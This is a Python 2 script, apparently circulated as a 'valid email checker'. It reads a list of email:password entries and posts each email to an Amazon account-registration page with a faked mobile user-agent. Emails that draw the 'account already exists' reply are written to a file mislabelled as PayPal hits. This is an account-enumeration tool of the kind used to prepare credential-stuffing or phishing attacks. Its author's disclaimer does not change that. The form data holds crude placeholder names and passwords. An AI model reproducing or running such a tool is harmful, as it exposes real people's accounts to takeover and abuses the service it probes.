import requests
import os
os.system("pip2 install requests")
os.system("clear")
live = open('PayPalLive.txt', 'w')
die = open('PayPalDie.txt', 'w')
os.system("xdg-open https://youtube.com/c/AdemStikage")
Checked = "Checked  Valid Email Checker"
print """








"""				
print "$ by mr. binyahia adem"
			 
print "$ telgram: @binyahia_adem"
print "$ >>> I am not responsible for any illegal use of the tool. You are the one who bears your responsibilities "
print
print
print
print
def exit():
	os.system("exit")


y = raw_input(" ! ..... : ")
print
#print("#"*30)

print" "
#list = open("list.txt" ,"r").read(
			  
link = "https://www.amazon.com/ap/register%3Fopenid.assoc_handle%3Dsmallparts_amazon%26openid.identity%3Dhttp%253A%252F%252Fspecs.openid.net%252Fauth%252F2.0%252Fidentifier_select%26openid.ns%3Dhttp%253A%252F%252Fspecs.openid.net%252Fauth%252F2.0%26openid.claimed_id%3Dhttp%253A%252F%252Fspecs.openid.net%252Fauth%252F2.0%252Fidentifier_select%26openid.return_to%3Dhttps%253A%252F%252Fwww.smallparts.com%252Fsignin%26marketPlaceId%3DA2YBZOQLHY23UT%26clientContext%3D187-1331220-8510307%26pageId%3Dauthportal_register%26openid.mode%3Dcheckid_setup%26siteState%3DfinalReturnToUrl%253Dhttps%25253A%25252F%25252Fwww.smallparts.com%25252Fcontactus%25252F187-1331220-8510307%25253FappAction%25253DContactUsLanding%252526pf_rd_m%25253DA2LPUKX2E7NPQV%252526appActionToken%25253DlptkeUQfbhoOU3v4ShyMQLid53Yj3D%252526ie%25253DUTF8%252Cregist%253Dtrue"
head = {'User-agent':'Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30'}
s = requests.session()
g = s.get(link, headers=head)
list = open('list.txt', 'r')
		
print("-"*55)
while True:
	email = list.readline().replace('\n','')
	if not email:
		break								   
	bacot = email.strip().split(':')
	xxx = {'customerName':'Androsex','email': bacot[0],'emailCheck': bacot[0],'password':'Kontol1337','passwordCheck':'Kontol1337'}
	cek = s.post(link, headers=head, data=xxx).text
	if "You indicated you are a new customer, but an account already exists with the e-mail" in cek:
		print("$ \033[32;1mlive\033[0m | "+email+" | done | by binyahia adem")
				     				      
		live.write(email + '\n')			     
	else:
		print("$ \033[31;1mdie\033[0m | "+email+" | done | by binyahia adem")
		       
							      
		die.write(email + '\n')
				    
print("-"*50)
print("\033[35;1mProccess Checking Done\033[0m")
print("PayPal Valid Email was Saved in PayPalLive.txt")


